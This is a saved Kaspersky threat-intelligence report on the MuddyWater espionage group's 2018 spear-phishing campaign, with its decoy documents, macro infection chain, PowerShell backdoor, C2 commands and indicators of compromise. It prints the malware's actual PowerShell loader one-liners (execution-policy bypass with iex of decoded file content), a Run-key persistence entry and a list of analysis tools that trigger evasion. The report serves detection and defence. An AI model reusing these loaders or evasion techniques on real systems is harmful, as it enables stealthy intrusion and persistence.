# Reference for threat actor for "MuddyWater, Seedworm, TEMP.Zagros, Static Kitten"

**Title**: MuddyWater expands operations | Securelist

**Source**: https://securelist.com/muddywater/88059/

## Content















MuddyWater expands operations | Securelist


































































Solutions for:

Home Products
Small Business 1-50 employees
Medium Business 51-999 employees
Enterprise 1000+ employees
 



















by Kaspersky


CompanyAccount
Get In Touch
Dark mode off
EnglishRussianSpanish













Solutions



Hybrid Cloud SecurityLearn More
Internet of Things & Embedded SecurityLearn More
Threat Management and DefenseLearn More
Industrial CybersecurityLearn More
Fraud PreventionLearn More



Other solutions
Blockchain Security
Kaspersky for Security Operations Center


Industries



National CybersecurityLearn More
Industrial CybersecurityLearn More
Finance Services CybersecurityLearn More
Healthcare CybersecurityLearn More
Transportation CybersecurityLearn More
Retail CybersecurityLearn More



Other Industries
Telecom Cybersecurity
Blockchain Security
View all


Products



KasperskyEndpoint Security for BusinessLearn More
KasperskyEndpoint Detection and Response (EDR)Learn More
KasperskyEDR OptimumLearn More
KasperskyAnti Targeted Attack PlatformLearn More
KasperskyManaged Detection and ResponseLearn More
KasperskySandboxLearn More



Other Products
Kaspersky Security for Mail Server
Kaspersky Security for Internet Gateway
Kaspersky Embedded Systems Security
Kaspersky Hybrid Cloud Security for AWS
Kaspersky Hybrid Cloud Security for Azure
View All


Services



KasperskyCybersecurity ServicesLearn More
KasperskyAdaptive Online TrainingLearn More
KasperskyPremium SupportLearn More
KasperskyThreat IntelligenceLearn More
KasperskyAPT Intelligence ReportingLearn More
KasperskyTargeted Attack DiscoveryLearn More



Other Services
Kaspersky Professional Services
Kaspersky Incident Response
Kaspersky Cybersecurity Training
Kaspersky Incident Communications
Kaspersky Security Awareness
View All


Resource Center

Case Studies
White Papers
Datasheets
Technologies
MITRE ATT&CK

About Us

Transparency
Corporate News
Press Center
Careers
Innovation Hub
Sponsorship
Policy Blog
Contacts

GDPR
 





Subscribe
 Dark mode off
Login


Securelist menu

EnglishRussianSpanish
Existing Customers

Personal

My Kaspersky
Renew your product
Update your product
Customer support

Business

KSOS portal
Kaspersky Business Hub
Technical Support
Knowledge Base
Renew License


Home

Products
Trials&Update
Resource Center

Business

Small Business (1-50 employees)
Medium Business (51-999 employees)
Enterprise (1000+ employees)


Securelist
Threats

Financial threats
Mobile threats
Web threats
Secure environment (IoT)
Vulnerabilities and exploits
Spam and Phishing
Industrial threats

Categories

APT reports
Incidents
Research
Malware reports
Spam and phishing reports
Publications
Kaspersky Security Bulletin

Archive
All Tags
APT Logbook
Webinars
Statistics
Encyclopedia
Threats descriptions
KSB 2021

About Us

Company
Transparency
Corporate News
Press Center
Careers
Sponsorships
Policy Blog
Contacts

Partners

Find a Partner
Partner Program
















Content menu
Close













Subscribe













by Kaspersky

 Dark mode off




ThreatsThreats

APT (Targeted attacks)
Secure environment (IoT)
Mobile threats
Financial threats
Spam and phishing
Industrial threats
Web threats
Vulnerabilities and exploits


CategoriesCategories

APT reports
Malware descriptions
Security Bulletin
Malware reports
Spam and phishing reports
Security technologies
Research
Publications


Other sections

Archive
All tags
Webinars
APT Logbook
Statistics
Encyclopedia
Threats descriptions
KSB 2023


 











 

APT reports

MuddyWater expands operations 

APT reports

10 Oct 2018

  minute read								
















Table of Contents





SummaryDecoy images by countryJordanTurkeySaudi ArabiaAzerbaijanIraqPakistanAfghanistanTechnical detailsThe initial infection vectorThe macro payload analysis, dropped files and registry keysCase 1: INF, SCT and text files dropped by the macroCase 2: VBS and text files dropped by the macroThe PowerShell codeCnC communicationVictim system reconnaissanceSupported commandsVictimologyAttacker deception and attributionRecommendations for organizationsConclusionAdditional informationIndicators of compromiseMD5File namesDomains, URLs and IP addresses 






 

Authors




GReAT





Summary
MuddyWater is a relatively new APT that surfaced in 2017. It has focused mainly on governmental targets in Iraq and Saudi Arabia, according to past telemetry. However, the group behind MuddyWater has been known to target other countries in the Middle East, Europe and the US. We recently noticed a large amount of spear phishing documents that appear to be targeting government bodies, military entities, telcos and educational institutions in Jordan, Turkey, Azerbaijan and Pakistan, in addition to the continuous targeting of Iraq and Saudi Arabia, other victims were also detected in Mali, Austria, Russia, Iran and Bahrain.. These new documents have appeared throughout 2018 and escalated from May onwards. The attacks are still ongoing.
The new spear-phishing docs used by MuddyWater rely on social engineering to persuade users to enable macros. The attackers rely on a range of compromised hosts to deliver their attacks. In the advanced stages of this research, we were able not only to observe additional files and tools from the attackers’ arsenal but also some OPSEC mistakes made by the attackers.
Previous related research:
https://sec0wn.blogspot.com/2018/05/clearing-muddywater-analysis-of-new.html?m=1
https://reaqta.com/2017/11/muddywater-apt-targeting-middle-east/
https://blog.malwarebytes.com/threat-analysis/2017/09/elaborate-scripting-fu-used-in-espionage-attack-against-saudi-arabia-government_entity/
https://www.sekoia.fr/blog/falling-on-muddywater/

Decoy images by country
Jordan




The Hashemite Kingdom of Jordan, Ministry of Justice (mwjo.doc)
DAMAMAX.doc



Turkey




Turkey’s General Directorate of Security
Turkey’s Directorate General of Coastal Safety







Turkey’s General Directorate of Security (Onemli Rapor.doc)
Turkey’s Ministry of the Interior (Early election.doc)



Saudi Arabia
Document signed by the Major General Pilot, commander of the Saudi Royal Air Force




KSA King Saud University (KSU)
KSA King Saud University (KSU)



Azerbaijan
İnkişaf üçün görüş.doc (meeting for development)
Iraq




Iraqi Ministry of Foreign Affairs
Government of Iraq, the Treasury of the Council of Ministers



Pakistan




ECP.doc
National Assembly of Pakistan.doc







P.Police.doc




Afghanistan
President.doc, E-government of Afghanistan
Technical details
Below is a description of the malware extraction and execution flow, starting from the initial infection vector, running VBA code via a macro and then dropping the PowerShell code that establishes command-center communications, sends victim system information and then receives commands supported by the malware.
The initial infection vector
The initial infection starts with macro-enabled Office 97-2003 Word files whose macros are usually password-protected to hinder static analysis.

Malicious obfuscated VBA code is executed when the macro is first enabled. In some cases, the malicious macro is also executed when the user activates a fake text box.
The macro payload analysis, dropped files and registry keys
The macro payload, which is Base64 encoded, does the following:

Drops two or three files into the “ProgramData” folder. The dropped files are either in the root of the “ProgramData” folder or in a subdirectory. The file names may vary from one version of the malware to another.


\EventManager.dll
\EventManager.logs
\WindowsDefenderService.inil


Adds a registry entry in the current user’s RUN key (HKCU) for later execution when the user next logs in. In some cases, the macro spawns the malicious payload/process instantly without waiting for the next time the user logs in. The registry keys and executables may vary from one version of the malware to another.


Name:WindowsDefenderUpdater
Type:REG_EXPAND_SZ
Data:c:\windows\system32\rundll32.exe advpack.dll,LaunchINFSection C:\ProgramData\EventManager.logs,Defender,1,

The next time the user logs in, the dropped payload will be executed. The executables have been chosen specifically for bypassing allowlisting solutions since they are all from Microsoft and very likely allowlisted. Regardless of the file extensions, the files dropped by the macro are EITHER INF, SCT and text files OR VBS and text files.
Case 1: INF, SCT and text files dropped by the macro

INF is launched via the advpack.dll “LaunchINFSection” function.
INF registers the SCT file (scriptlet file) via scrobj.dll (Microsoft Scriptlet library).
Via WMI (winmgmt), the JavaScript or VBscript code in the SCT file spawns a PowerShell one-liner which finally consumes the text file.


powershell.exe -exec Bypass -c $s=(get-content C:\\ProgramData\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(”,$d));

PowerShell one-liner
Encoded text file
Execution flow:

Case 2: VBS and text files dropped by the macro
The VBS file decodes itself and calls mshta.exe, passing on one line of VBScript code to it, which in turn spawns a PowerShell one-liner which finally consumes the text file (usually Base64-encoded text).

powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\ProgramData\ZIPSDK\ProjectConfManagerNT.ini))));

PowerShell one-liner
Encoded text file
Execution flow:

The PowerShell code
When PowerShell is invoked whether via WMI, wscript.exe, or mshta.exe, it executes a one-liner PowerShell code (as outlined above) that reads the encoded text file dropped in ProgramData and then decodes it. The resulting code has multiple layers of obfuscation.
The first thing the PowerShell code does is to disable office “Macro Warnings” and “Protected View“. This is to ensure future attacks don’t require user interaction. It also allows macro code to access internal VBA objects for stealthier macro code execution in future attacks.

Next, it checks the running processes against a list of hard-coded process names; if any are found, the machine is forcefully rebooted. The names are linked to various tools used by malware researchers.


“win32_remote“,”win64_remote64“,”ollydbg“,”ProcessHacker“,”tcpview“,”autoruns“,”autorunsc“,”filemon“,”procmon“,”regmon“,”procexp“,”idaq“,”idaq64“,”ImmunityDebugger“,”Wireshark“,”dumpcap“,”HookExplorer“,”ImportREC“,”PETools“,”LordPE“,”dumpcap“,”SysInspector“,”proc_analyzer“,”sysAnalyzer“,”sniff_hit“,”windbg“,”joeboxcontrol“,”joeboxserver“

Denylisted process names in the malware
In some cases, it calculates the checksum of each running process name, and if it matches any hard-coded checksums, it causes a BSOD via the ntdll.dll “NtRaiseHardError” function.
CnC communication
A URL is selected at random from a long list of embedded URLs held in an array named $dragon_middle. The selected URL is subsequently used for communication with the CnC server. If it can’t send data to the chosen CnC URL, it tries to obtain another random URL from $middle_dragon, then sleeps from one to 30 seconds and loops again.

Victim system reconnaissance
The code then tries to obtain the victim’s public IP via “https://api.ipify.org/”.
The public IP is then POSTed along with OS Version, Internal IP, Machine Name, Domain Name, UserName after being encrypted to the previously chosen URL to register a new victim. This allows the attackers to accept or reject victims depending on their IPs, countries, geolocations, target enterprises, etc. Depending on the response from the attacker’s CnC, the victim is assigned an ID $sysid. This ID is sent to the CnC with each request for commands to execute.
Supported commands
“upload“, “screenshot“, “Excel“, “Outlook“, “risk“, “reboot“, “shutdown“, “clean“. These commands vary from one version to another.

The “screenshot” command takes a screenshot that is saved as a.PNG file in “ProgramData“.
The “Excel” command receives another stage of the PowerShell code, saves it in “c:\programdata\a.ps1” and then asks Excel to execute this PowerShell script via DDE.
The “Outlook” command receives another stage of the PowerShell code, saves it in “c:\programdata\a.ps1” and then asks Outlook via COM, via MSHTA.exe, to execute it.
The “risk” command receives another stage of the PowerShell code, saves it in “c:\programdata\a.ps1” and then asks Explorer.exe via COM interaction to execute it.
The “upload” command downloads files from the CnC and saves them locally in “C:\ProgramData“.
The “clean” command destroys the victim’s disk drives C, D, E, F and then reboots.
The “reboot” and “shutdown” commands immediately reboot and shut down the victim’s machine.

In one version of the malware, the code checks if the “ProgramData” folder has folders or files with the keywords  “Kasper“, “Panda“, or “ESET“.

Victimology

Most victims of MuddyWater were found in Jordan, Turkey, Iraq, Pakistan, Saudi Arabia, Afghanistan and Azerbaijan. Other victims were also recorded in Russia, Iran, Bahrain, Austria and Mali. The malicious decoy documents used in the attacks suggest they are geopolitically motivated, targeting sensitive personnel and organizations.
Attacker deception and attribution
The deobfuscated PowerShell code used by the MuddyWater group resembles previously seen PowerShell scripts that most likely served as prototypes. Multiple documents used in the attacks also contain embedded paths from their authors’ machines. These paths are embedded by Office under various circumstances, for instance, when somebody adds a binary object (an OLE control, e.g. text box or command button) into a Word document. The paths discovered are:

• C:\Users\leo\AppData\Local\Temp\Word8.0\MSForms.exd
• C:\Users\poopak\AppData\Local\Temp\Word8.0\MSForms.exd
• C:\Users\Vendetta\AppData\Local\Temp\Word8.0\MSForms.exd
• C:\Users\Turk\AppData\Local\Temp\Word8.0\MSForms.exd


Leo, Poopak, Vendetta and Turk are the usernames of those creating the documents or the templates on which they are based. Turk could point to a person of Turkish origin. Poopak is a Persian girl’s name or might suggest the authors are not entirely happy with “Pak”, which could be short for Pakistan. Leo could be one of the attacker’s names. We also don’t rule out the possibility of false flags, with the attackers using random usernames to confuse researchers.
In multiple instances, we have also found Chinese text inside the samples, possibly indicating the reuse of code by the attackers.

无法连接到网址，请等待龙…
无法访问本地计算机寄存器
任务计划程序访问被拒绝

Chinese text found in PowerShell code in multiple samples

Unable to connect to the URL, please wait for the dragon…
Unable to access local computer register
Task Scheduler access denied

Translation of Chinese text
We have also noticed that for some samples, e.g. 5a42a712e3b3cfa1db32d9e3d832f8f1, the PowerShell code had only three CnC URLs, which leads us to believe that most of the CnC URLs in $dragon_middle found in other samples could actually be ‘noise’ to distract researchers or trigger false positives.

http://www.cankayasrc[.]com/style/js/main.php
http://ektamservis[.]com/includes/main.php
http://gtme[.]ae/font-awesome/css/main.php

Recommendations for organizations
Effective protection from targeted attacks focuses on advanced detective, preventive and investigative capabilities via solutions and training, allowing an organization to control any activities on their network or suspicious files on user systems.
The best way to prevent attackers from finding and leveraging security holes, is to eliminate the holes altogether, including those related to improper system configurations or errors in proprietary applications. Organizations are also recommended to implement the following steps for an enhanced level of protection at their premises.

Use PowerShell Constrained Language Mode as it uses IEX, Add-Type, and New-Object.
Lock PowerShell Execution Policy, must be set to “AllSigned” via GPO.
An allowlisting solution to prevent certain process child-parent execution hierarchies.

Conclusion
The MuddyWaters group has carried out a large number of attacks and demonstrated advanced social engineering, in addition to the active development of attacks, infrastructure and the use of new methods and techniques. The attackers are actively improving their toolkit in an effort to minimize their exposure to security products and services. Kaspersky Lab expects these types of attacks to intensify in the near future.
In order to protect your company from malware, Kaspersky Lab researchers recommend implementing the following measures:

Educate generic staff to be able to distinguish malicious behavior like phishing links.
Educate information security staff to have full configuration, investigative and hunting abilities.
Use a proven corporate-grade security solution in combination with anti-targeted attack solutions capable of detecting attacks by analyzing network anomalies.
Provide security staff with access to the latest threat intelligence data, which will arm them with helpful tools for targeted attack prevention and discovery, such as indicators of compromise and YARA rules.
Make sure enterprise-grade patch management processes are well established and executed.

High-profile organizations should have elevated levels of cybersecurity, attacks against them are inevitable and are unlikely to ever cease.
Additional information
In the advanced stages of this research, we were able not only to observe additional files and tools from the attackers’ arsenal but also some OPSEC mistakes made by the attackers.
Further details about the attackers’ arsenal, additional indicators of compromise, YARA rules and attribution information is available to customers of Kaspersky Intelligence Reporting. Contact: intelreports@kaspersky.com
Indicators of compromise
MD5
08acd1149b09bf6455c553f512b51085
a9ec30226c83ba6d7abb8d2011cdae14
E5683fb480353c0dec333a7573710748
159238b473f80272fdcd0a8ddf336a91
16ac1a2c1e1c3b49e1a3a48fb71cc74f
1b086ab28e3d6f73c6605f9ae087ad4a
23c82e8c028af5c64cbe37314732ec19
24e1bd221ba3813ed7b6056136237587
2e82e242cb0684b98a8f6f2c0e8a12f3
37f7e6e5f073508e1ee552ebea5d200e
3bb14adb551663fd2328d59f653ba757
3c2a0d6d0ecf06f1be9ad411d06f7ba8
4c5a5c236c9f4480b3d725f297673fad
4f873578956d2790101443f24e4bd4d3
5466c8a099d1d30096775b1f4357d3cf
59502e209aedf80e170e653306ca1553
5a42a712e3b3cfa1db32d9e3d832f8f1
5bd61a94e7698574eaf82ef277316463
5de97ae178888f2dd222bb8a66060ac2
665947cf7037a6772687b69279753cdf
7a2ff07283ddc69d9f34cfa0d3c936d4
7beb94f602e97785370fec2d059d54a5
801f34abbf90ac2b4fb4b6289830cd16
864d6321be50f29e7a7a4bfab746245a
8a36d91ca331f62642dbcafc2ea1b1ab
9486593e4fb5a4d440093d54a3519187
94edf251b5fe7cc19488b5f0c3c3e359
9c6648cedeb3f5d9f6d104e638bd0c3d
9f4044674100a8c28f9ed1b336c337ce
aa1e8d0e1c4d4eb9984124df003ea7f2
aa564e207926d06b8a59ba50ca2c543d
ab4f947f4649b9ec28d182b02778aa69
ad92ccf85ec170f340457d33bbb81df5
b8939fa58fad8aa1ec271f6dae0b7255
bb476622bcb0c666e12fbe4ccda8bbef
be62fc5b1576e0a8491519e10bab931d
bf310319d6ef95f69a45fc4f2d237ed4
c375bbf248592cee1a1999227457c300
c73fc71ee35e99230941f03fc32934d9
c8b0458c384fd34971875b1c753c9c7c
cd371d1d3bd7c8e2110587cfa8b7eaea
ce2df2907ce543438c19cfaf6c14f699
d15aee026074fbd18f780fb51ec0632a
d632c8444aab1b43a663401e80c0bac4
d6acee43d61cbd4bcd7a5bdf4ed9b343
e3e25957b738968befcf2333aa637d97
e5683fb480353c0dec333a7573710748
eb69fb45feb97af81c2f306564acc2da
f00fd318bf58586c29ab970132d1fd2a
f2b5373f32a4b9b3d34701ff973ba69c
f84914c30ae4e6b9b1f23d5c01e001ed
faa4469d5cd90623312c86d651f2d930
Ffb8ea0347a3af3dd2ab1b4e5a1be18a
345b1ea293764df86506f97ba498cc5e
029cb7e622f4eb0d058d577c9d322e92
06178b5181f30ce00cd55e2690f667ac
2b8ab9112e34bb910055d85ec800db3f
47ec75d3290add179ac5218d193bb9a8
befc203d7fa4c91326791a73e6d6b4da
C561e81e30316208925bfddb3cf3360a
132efd7b3bdfb591c1bf2a4e19c710eb
e7a6c57566d9523daa57fe16f52e377e
c0e35c4523a7931f4c99616d6079fd14
245fa82c89875b70c2669921d4ba14d3
File names
%SystemDrive%\ProgramData\EventManager.dll
%SystemDrive%\ProgramData\EventManager.logs
%SystemDrive%\ProgramData\WindowsDefenderService.ini
%SystemDrive%\ProgramData\Defender.sct
%SystemDrive%\ProgramData\DefenderService.inf
%SystemDrive%\ProgramData\WindowsDefender.ini
%SystemDrive%\ProgramData\ZIPSDK\InstallConfNT.vbs
%SystemDrive%\ProgramData\ZIPSDK\ProjectConfManagerNT.ini
%SystemDrive%\ProgramData\WindowsDefenderTask.ini
%SystemDrive%\ProgramData\WindowsDefenderTask.txt
%SystemDrive%\ProgramData\WindowsDefenderTask.xml
%SystemDrive%\ProgramData\DefenderNT\ConfigRegister.vbs
%SystemDrive%\ProgramData\DefenderNT\SetupConf.ini
%SystemDrive%\ProgramData\ASDKiMalwareSDK\ProjectConfSDK.vbs
%SystemDrive%\ProgramData\ASDKiMalwareSDK\SetupConfSDK.ini
%SystemDrive%\ProgramData\FirefoxSDK\ConfigRegisterSDK.ini
%SystemDrive%\ProgramData\FirefoxSDK\ConfigRegisterSDK.vbs
%SystemDrive%\ProgramData\OneDrive.dll
%SystemDrive%\ProgramData\OneDrive.html
%SystemDrive%\ProgramData\OneDrive.ini
%SystemDrive%\ProgramData\WindowsNT\WindowsNT.ini
%SystemDrive%\ProgramData\WindowsNT\WindowsNT.vbs
%SystemDrive%\ProgramData\SYSTEM32SDK\ConfManagerNT.vbs
%SystemDrive%\ProgramData\SYSTEM32SDK\ProjectConfManagerNT.ini
%windir%\System32\Tasks\Microsoft\WindowsDefenderUpdater
%windir%\System32\Tasks\Microsoft\MicrosoftOneDrive
%windir%\System32\Tasks\Microsoft\WindowsDifenderUpdate
%windir%\System32\Tasks\Microsoft\WindowsSystem32SDK
%windir%\System32\Tasks\Microsoft\WindowsDefenderSDK
%windir%\System32\Tasks\Microsoft\WindowsMalwareDefenderSDK
%windir%\System32\Tasks\Microsoft\WindowsMalwareByteSDK
Domains, URLs and IP addresses
http://www.cankayasrc[.]com/style/js/main.php
http://ektamservis[.]com/includes/main.php
http://gtme[.]ae/font-awesome/css/main.php
https://www.adfg[.]ae/wp-includes/widgets/main.php
http://adibf[.]ae/wp-includes/js/main.php
http://hubinasia[.]com/wp-includes/widgets/main.php
https://benangin[.]com/wp-includes/widgets/main.php
104.237.233.60
104.237.255.212
104.237.233.40
5.9.0.155






APT
Macros
Phishing
PowerShell
Spear phishing



Authors




GReAT





MuddyWater expands operations 
 Your email address will not be published. Required fields are marked *Name * 
Email * 

  




Cancel 

Δ 
















Table of Contents





SummaryDecoy images by countryJordanTurkeySaudi ArabiaAzerbaijanIraqPakistanAfghanistanTechnical detailsThe initial infection vectorThe macro payload analysis, dropped files and registry keysCase 1: INF, SCT and text files dropped by the macroCase 2: VBS and text files dropped by the macroThe PowerShell codeCnC communicationVictim system reconnaissanceSupported commandsVictimologyAttacker deception and attributionRecommendations for organizationsConclusionAdditional informationIndicators of compromiseMD5File namesDomains, URLs and IP addresses 





GReAT webinars






																		13 May 2021, 1:00pm								
GReAT Ideas. Balalaika Edition 





Boris Larin



Denis Legezo










																		26 Feb 2021, 12:00pm								
GReAT Ideas. Green Tea Edition 





John Hultquist



Brian Bartholomew



Suguru Ishimaru



Vitaly Kamluk



Seongsu Park



Yusuke Niwa



Motohiko Sato










																		17 Jun 2020, 1:00pm								
GReAT Ideas. Powered by SAS: malware attribution and next-gen IoT honeypots 





Marco Preuss



Denis Legezo



Costin Raiu



Kurt Baumgartner



Dan Demeter



Yaroslav Shmelev










																		26 Aug 2020, 2:00pm								
GReAT Ideas. Powered by SAS: threat actors advance on new fronts 





Ivan Kwiatkowski



Maher Yamout



Noushin Shabab



Pierre Delcher



Félix Aime



Giampaolo Dedola



Santiago Pontiroli










																		22 Jul 2020, 2:00pm								
GReAT Ideas. Powered by SAS: threat hunting and new techniques 





Dmitry Bestuzhev



Costin Raiu



Pierre Delcher



Brian Bartholomew



Boris Larin



Ariel Jungheit



Fabio Assolini












From the same authors




 


Coyote: A multi-stage banking Trojan abusing the Squirrel installer 






 


FakeSG campaign, Akira ransomware and AMOS macOS stealer 






 


Advanced threat predictions for 2024 






 


Stealer for PIX payment system, new Lumar stealer and Rhysida ransomware 






 


Updated MATA attacks industrial companies in Eastern Europe 









Subscribe to our weekly e-mails
The hottest research right in your inbox




Email*

*

I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I find at the bottom of any e-mail sent to me for the purposes mentioned above.

 
 Subscribe










Δ








In the same category




 


HrServ – Previously unknown web shell used in APT attack 






 


Modern Asian APT groups’ tactics, techniques and procedures (TTPs) 






 


A cascade of compromise: unveiling Lazarus’ new campaign 






 


How to catch a wild triangle 






 


StripedFly: Perennially flying under the radar 






 















Latest Posts




 



Malware descriptions

Cracked software beats gold: new macOS backdoor stealing cryptowallets 





Sergey Puzan










 



Kaspersky Security Bulletin

Dark web threats and dark market predictions for 2024 





Sergey Lozhkin



Anna Pavlovskaya



Kaspersky Security Services










 



Research

A lightweight method to detect potential iOS malware 





Maher Yamout










 



Research

Operation Triangulation: The last (hardware) mystery 





Boris Larin












Latest Webinars





 




Technologies and services



												11 Dec 2023, 4:00pm					
60 min

The Future of AI in cybersecurity: what to expect in 2024






Vladimir Dashchenko



Victor Sergeev



Vladislav Tushkanov



Dennis Kipker











 




Threat intelligence and IR



												30 Nov 2023, 4:00pm					
70 min

Responding to a data breach: a step-by-step guide






Anna Pavlovskaya











 




Cyberthreat talks



												14 Nov 2023, 4:00pm					
60 min

2024 Advanced persistent threat predictions






Igor Kuznetsov



David Emm



Marc Rivero



Dan Demeter



Sherif Magdy











 




Cyberthreat talks



												09 Nov 2023, 5:00pm					
60 min

Overview of modern car compromise techniques and methods of protection






Alexander Kozlov



Sergey Anufrienko












Reports







HrServ – Previously unknown web shell used in APT attack 

In this report Kaspersky researchers provide an analysis of the previously unknown HrServ web shell, which exhibits both APT and crimeware features and has likely been active since 2021.








Modern Asian APT groups’ tactics, techniques and procedures (TTPs) 

Asian APT groups target various organizations from a multitude of regions and industries. We created this report to provide the cybersecurity community with the best-prepared intelligence data to effectively counteract Asian APT groups.








A cascade of compromise: unveiling Lazarus’ new campaign 

We unveil a Lazarus campaign exploiting security company products and examine its intricate connections with other campaigns








How to catch a wild triangle 

How Kaspersky researchers obtained all stages of the Operation Triangulation campaign targeting iPhones and iPads, including zero-day exploits, validators, TriangleDB implant and additional modules.








 









Subscribe to our weekly e-mails
The hottest research right in your inbox





Email*

*

I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I find at the bottom of any e-mail sent to me for the purposes mentioned above.

 
 Subscribe











Δ








 











ThreatsThreats

APT (Targeted attacks)
Secure environment (IoT)
Mobile threats
Financial threats
Spam and phishing
Industrial threats
Web threats
Vulnerabilities and exploits


CategoriesCategories

APT reports
Malware descriptions
Security Bulletin
Malware reports
Spam and phishing reports
Security technologies
Research
Publications


Other sections

Archive
All tags
Webinars
APT Logbook
Statistics
Encyclopedia
Threats descriptions
KSB 2023


 









© 2024 AO Kaspersky Lab. All Rights Reserved.
Registered trademarks and service marks are the property of their respective owners.



Privacy Policy
License Agreement
Cookies












Subscribe to our weekly e-mails
The hottest research right in your inbox



Email*

*

I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I find at the bottom of any e-mail sent to me for the purposes mentioned above.

 
 Subscribe










Δ



























